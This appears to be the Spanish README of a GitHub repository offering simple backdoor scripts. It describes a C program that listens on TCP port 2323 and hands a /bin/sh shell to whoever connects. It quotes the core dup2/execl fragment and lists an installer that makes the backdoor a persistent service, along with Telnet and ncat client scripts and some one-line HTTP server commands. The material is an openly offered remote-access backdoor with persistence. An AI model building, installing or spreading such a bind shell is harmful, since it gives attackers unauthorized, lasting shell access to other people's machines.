<img style="float:left" alt="http://hackingyseguridad.com/" src="https://github.com/hackingyseguridad/ia/blob/main/banner.png">

---

### puertatrasera
Simples Script en distintos lenguakes, para crear una backdoor o puertra trasera

---

### Tabla de Contenido

- [Características](#-características)
- [Archivos del Repositorio](#-archivos-del-repositorio)
- [Detalles de los Scripts](#-detalles-de-los-scripts)
- [Instalación y Uso](#-instalación-y-uso)
- [Ejemplos de Backdoors Alternativos](#-ejemplos-de-backdoors-alternativos)
- [Puertas Traseras en Dispositivos Reales (Contexto)](#-puertas-traseras-en-dispositivos-reales-contexto)
- [Seguridad y Advertencias](#-seguridad-y-advertencias)
- [Licencia](#-licencia)

---

### Características

- Backdoor en C compilado (persistente)
- Script de instalación automática (`instalar.sh`)
- Cliente Telnet/NC simple (Linux y Windows)
- Ejemplos de servidores web temporales en múltiples lenguajes
- Documentación adicional sobre backdoors en routers Huawei y contexto de seguridad

---

## 📁 Archivos del Repositorio

| Archivo                  | Tipo       | Descripción                                      | Idioma    |
|--------------------------|------------|--------------------------------------------------|-----------|
| `backdoor.c`            | Fuente     | Código fuente del backdoor en C                  | C         |
| `backdoor`              | Binario/Script | Backdoor compilado (shell wrapper)              | Shell     |
| `instalar.sh`           | Script     | Instalación como servicio persistente            | Bash      |
| `telnetcliente`         | Script     | Cliente para conectarse desde Linux              | Bash      |
| `telnetcliente.bat`     | Script     | Cliente para Windows (usa ncat)                  | Batch     |
| `puertastraseras.md`    | Documento  | Análisis de backdoors en routers Huawei          | Markdown  |
| `Informe_2023.md`       | Documento  | Resumen del informe HCSEC sobre Huawei           | Markdown  |
| `README.md`             | Documento  | Este archivo                                     | Markdown  |
| `LICENSE`               | Legal      | GPL-3.0                                          | -         |

---

## 🔍 Detalles de los Scripts

### 1. `backdoor.c` (Backdoor en C)

**Función principal:** Servidor TCP que abre un shell al conectarse.

**Características técnicas:**

- Puerto: **TCP 2323**
- Escucha en todas las interfaces (`INADDR_ANY`)
- Soporta múltiples conexiones (fork por cliente)
- Redirige `stdin/stdout/stderr` al socket
- Ejecuta `/bin/sh` o `/bin/bash`
- Mensajes informativos en consola

```c
// Fragmento clave
address.sin_port = htons(2323);
...
dup2(client_fd, 0);  // stdin
dup2(client_fd, 1);  // stdout
dup2(client_fd, 2);  // stderr
execl("/bin/sh", "sh", NULL);

```

### Serbidores HTTP temporales:

Lenguaje,Comando
BusyBox,busybox httpd -f -p 8000
Python 2,python -m SimpleHTTPServer 8000
Python 3,python -m http.server 8000
Ruby,"ruby -rwebrick -e'WEBrick::HTTPServer.new(:Port => 8000, :DocumentRoot => Dir.pwd).start'"
PHP,php -S 127.0.0.1:8000


